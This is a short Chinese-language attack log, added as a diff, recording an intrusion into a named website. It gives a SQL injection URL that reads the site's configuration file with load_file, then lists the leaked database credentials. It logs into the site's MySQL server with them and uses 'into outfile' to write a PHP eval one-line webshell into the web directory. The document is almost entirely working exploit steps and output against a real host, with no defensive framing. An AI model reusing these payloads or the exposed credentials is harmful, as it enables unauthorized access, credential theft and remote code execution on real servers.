@@ -1,0 +1,26 @@
+http://www.czxtaiji.net/content.php?Id=-48 union select 1,2,3,
+4,substring(load_file(0x643A5C637A78736974655C62696E5C7379735C636F6E6669672E706870),780,300),6,7,8,9/*
+
+读取到如下内容：
+
+$def_db_admin = "czxtaiji"; // 资料库帐号 
+$def_db_passwd = "czxtaiji"; // 管理密码 
+$def_select_db = "czxtaiji"; //
+$def_db_admin = "czxtaiji";
+$def_db_passwd = "czxtaiji"
+$def_select_db = "czxtaiji"
+
+链接
+mysql -hwww.czxtaiji.net -uczxtaiji -p czxtaiji
+mysql> select version();
+
+| 4.0.18-nt |
+
+mysql> show databases;
+
+赶紧往数据库里写马
+create table gongji(str TEXT);?
+insert into gongji values("<?php eval($_POST[cmd])?>");
+select * from gongji into outfile 'd:/czxsite/bin/gongji.php';
+
+一句话木马链接操之：
